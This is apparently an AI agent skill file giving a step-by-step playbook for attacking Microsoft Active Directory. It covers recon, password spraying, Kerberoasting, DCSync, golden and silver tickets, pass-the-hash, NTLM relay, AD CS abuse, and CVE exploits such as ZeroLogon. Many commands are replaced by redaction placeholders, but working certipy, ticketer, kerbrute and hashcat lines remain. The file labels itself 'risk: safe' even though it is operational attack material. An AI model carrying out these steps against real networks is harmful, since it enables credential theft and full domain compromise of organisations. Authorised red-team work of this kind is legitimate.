---
name: active-directory-attacks
description: "Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing."
risk: safe
source: community
author: zebbern
date_added: "2026-02-27"
---

# Active Directory Attacks

## Purpose

Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing.

## Inputs/Prerequisites

- Kali Linux or Windows attack platform
- Domain user credentials (for most attacks)
- Network access to Domain Controller
- Tools: Impacket, Mimikatz, BloodHound, Rubeus, CrackMapExec

## Outputs/Deliverables

- Domain enumeration data
- Extracted credentials and hashes
- Kerberos tickets for impersonation
- Domain Administrator access
- Persistent access mechanisms

---

## Essential Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack tools |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Network exploitation |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |

---

## Core Workflow

### Step 1: Kerberos Clock Sync

Kerberos requires clock synchronization (±5 minutes):

```bash
# Detect clock skew
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "14 APR 2024 18:25:16"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Step 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python collector (from Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Step 3: PowerView Enumeration

```powershell
# Get domain info
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# Enumerate users
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Enumerate groups
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Find local admin access
Find-LocalAdminAccess -Verbose

# User hunting
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

---

## Credential Attacks

### Password Spraying

```bash
# Using kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# Using CrackMapExec
[REDACTED_CME_EXPLOIT]
```

### Kerberoasting

Extract service account TGS tickets and crack offline:

```bash
# Impacket
[REDACTED_GETUSERSPNS_COMMAND]

# Rubeus
[REDACTED_RUBEUS_KERBEROAST]

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

### AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication":

```bash
# Impacket
[REDACTED_GETNPUSERS_COMMAND]

# Rubeus
[REDACTED_RUBEUS_ASREPROAST]

# Crack with hashcat
hashcat -m 18200 hashes.txt rockyou.txt
```

### DCSync Attack

Extract credentials directly from DC (requires Replicating Directory Changes rights):

```bash
# Impacket
[REDACTED_SECRETSDUMP_COMMAND] -just-dc-user krbtgt

# Mimikatz
[REDACTED_MIMIKATZ_DCSYNC]
[REDACTED_MIMIKATZ_DCSYNC]
```

---

## Kerberos Ticket Attacks

### Pass-the-Ticket (Golden Ticket)

Forge TGT with krbtgt hash for any user:

```powershell
# Get krbtgt hash via DCSync first
# Mimikatz - Create Golden Ticket
[REDACTED_MIMIKATZ_GOLDEN_TICKET]

# Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
[REDACTED_PSEXEC_COMMAND]
```

### Silver Ticket

Forge TGS for specific service:

```powershell
# Mimikatz
[REDACTED_MIMIKATZ_SILVER_TICKET]
```

### Pass-the-Hash

```bash
# Impacket
[REDACTED_PSEXEC_COMMAND] -hashes :NTHASH
[REDACTED_WMIEXEC_COMMAND] -hashes :NTHASH
[REDACTED_SMBEXEC_COMMAND] -hashes :NTHASH

# CrackMapExec
[REDACTED_CME_EXPLOIT] -d domain.local
[REDACTED_CME_EXPLOIT] --local-auth
```

### OverPass-the-Hash

Convert NTLM hash to Kerberos ticket:

```bash
# Impacket
getTGT.py domain.local/user -hashes :NTHASH
export KRB5CCNAME=user.ccache

# Rubeus
[REDACTED_RUBEUS_ASKTGT]
```

---

## NTLM Relay Attacks

### Responder + ntlmrelayx

```bash
# Start Responder (disable SMB/HTTP for relay)
responder -I eth0 -wrf

# Start relay
[REDACTED_NTLMRELAYX_COMMAND]

# LDAP relay for delegation attack
[REDACTED_NTLMRELAYX_COMMAND]
```

### SMB Signing Check

```bash
[REDACTED_CME_EXPLOIT] targets.txt
```

---

## Certificate Services Attacks (AD CS)

### ESC1 - Misconfigured Templates

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# Exploit ESC1
certipy req -u user@domain.local -p password -ca CA-NAME -target dc.domain.local -template VulnTemplate -upn administrator@domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC8 - Web Enrollment Relay

```bash
[REDACTED_NTLMRELAYX_COMMAND]
```

---

## Critical CVEs

### ZeroLogon (CVE-2020-1472)

```bash
# Check vulnerability
[REDACTED_CME_EXPLOIT]

# Exploit
[REDACTED_ZEROLOGON_EXPLOIT]

# Extract hashes
[REDACTED_SECRETSDUMP_COMMAND] -no-pass

# Restore password (important!)
python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
```

### PrintNightmare (CVE-2021-1675)

```bash
# Check for vulnerability
rpcdump.py @10.10.10.10 | grep 'MS-RPRN'

# Exploit (requires hosting malicious DLL)
[REDACTED_PRINTNIGHTMARE_EXPLOIT]
```

### samAccountName Spoofing (CVE-2021-42278/42287)

```bash
# Automated exploitation
[REDACTED_SAM_SPOOFING_EXPLOIT]
```

---

## Quick Reference

| Attack | Tool | Command |
|--------|------|---------|
| Kerberoast | Impacket | `[REDACTED_GETUSERSPNS_COMMAND]` |
| AS-REP Roast | Impacket | `[REDACTED_GETNPUSERS_COMMAND]` |
| DCSync | secretsdump | `[REDACTED_SECRETSDUMP_COMMAND]` |
| Pass-the-Hash | psexec | `[REDACTED_PSEXEC_COMMAND]` |
| Golden Ticket | Mimikatz | `[REDACTED_MIMIKATZ_GOLDEN_TICKET]` |
| Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |

---

## Constraints

**Must:**
- Synchronize time with DC before Kerberos attacks
- Have valid domain credentials for most attacks
- Document all compromised accounts

**Must Not:**
- Lock out accounts with excessive password spraying
- Modify production AD objects without approval
- Leave Golden Tickets without documentation

**Should:**
- Run BloodHound for attack path discovery
- Check for SMB signing before relay attacks
- Verify patch levels for CVE exploitation

---

## Examples

### Example 1: Domain Compromise via Kerberoasting

```bash
# 1. Find service accounts with SPNs
[REDACTED_GETUSERSPNS_COMMAND]

# 2. Request TGS tickets
[REDACTED_GETUSERSPNS_COMMAND]

# 3. Crack tickets
hashcat -m 13100 tgs.txt rockyou.txt

# 4. Use cracked service account
[REDACTED_PSEXEC_COMMAND]
```

### Example 2: NTLM Relay to LDAP

```bash
# 1. Start relay targeting LDAP
[REDACTED_NTLMRELAYX_COMMAND]

# 2. Trigger authentication (e.g., via PrinterBug)
[REDACTED_PRINTERBUG_EXPLOIT]

# 3. Use created machine account for RBCD attack
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| BloodHound empty | Verify collector ran with correct creds |

---

## Additional Resources

For advanced techniques including delegation attacks, GPO abuse, RODC attacks, SCCM/WSUS deployment, ADCS exploitation, trust relationships, and Linux AD integration, see [references/advanced-attacks.md](references/advanced-attacks.md).

## When to Use
This skill is applicable to execute the workflow or actions described in the overview.
